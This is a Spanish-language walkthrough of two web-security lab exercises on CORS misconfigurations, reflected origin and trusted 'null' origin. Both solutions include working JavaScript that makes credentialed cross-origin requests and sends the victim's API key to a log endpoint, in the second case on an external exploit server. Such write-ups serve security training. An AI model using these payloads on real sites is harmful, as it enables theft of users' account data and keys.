# Cross-origin resource sharing (CORS)

## Lab: CORS vulnerability with basic origin reflection

### Enunciado

Este sitio web tiene una configuración CORS insegura, ya que confía en todos los orígenes. Crea un código JavaScript que use CORS para obtener la clave API del administrador y súbelo a tu servidor de exploits. El laboratorio se considera resuelto cuando logres enviar con éxito la clave API del administrador.

Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:

* **Usuario:** `wiener`
* **Contraseña:** `peter`

### Resolución

Nos logueamos. Vemos la petición de los detalles del usuario.

<figure><img src="../../.gitbook/assets/image (1514).png" alt=""><figcaption></figcaption></figure>

Vemos que se encuentra la cabecera **Access-Control-Allow-Credentials** que es vulnerable a CORS. Añadimos la cabecera **Origin**.

<figure><img src="../../.gitbook/assets/image (1515).png" alt=""><figcaption></figcaption></figure>

Sabiendo esto realizamos este script para enviarlo a la víctima.

```
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://0a6b006e0413a15d83e2e31b00e70026.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
      location='/log?key='+this.responseText;
  };
</script>

```

Viendo los logs vemos que una petición al enviarle a la víctima que decodificamos.

<figure><img src="../../.gitbook/assets/image (1516).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1517).png" alt=""><figcaption></figcaption></figure>

Hemos encontrado la API.

<figure><img src="../../.gitbook/assets/image (1518).png" alt=""><figcaption></figcaption></figure>

## Lab: CORS vulnerability with trusted null origin

### Enunciado

Este sitio web tiene una configuración CORS insegura, ya que confía en el origen "null". Crea un código JavaScript que use CORS para obtener la clave API del administrador y súbelo a tu servidor de exploits. El laboratorio se considera resuelto cuando logres enviar con éxito la clave API del administrador.

Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:

* **Usuario:** `wiener`
* **Contraseña:** `peter`

### Resolución

Nos logueamos. Vemos la petición de los detalles del usuario.

<figure><img src="../../.gitbook/assets/image (1519).png" alt=""><figcaption></figcaption></figure>

Vemos que se encuentra la cabecera **Access-Control-Allow-Credentials** que es vulnerable a CORS. Añadimos la cabecera **Origin**.

<figure><img src="../../.gitbook/assets/image (1520).png" alt=""><figcaption></figcaption></figure>

Vemos que no está permitido el acceso desde **test.com**. Tras esto lo cambiamos a **null** el **Origin**.

<figure><img src="../../.gitbook/assets/image (1521).png" alt=""><figcaption></figcaption></figure>

Vemos que ahora sí que hay acceso a nulos. Sabiendo esto realizamos el script.

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://0a47008e03322d42809f12540004005c.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
      location='https://exploit-0afe000e03de2d7f80ef1117010800cb.exploit-server.net/exploit/log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

Viendo los logs vemos que una petición al enviarle a la víctima que decodificamos.

<figure><img src="../../.gitbook/assets/image (1522).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1523).png" alt=""><figcaption></figcaption></figure>
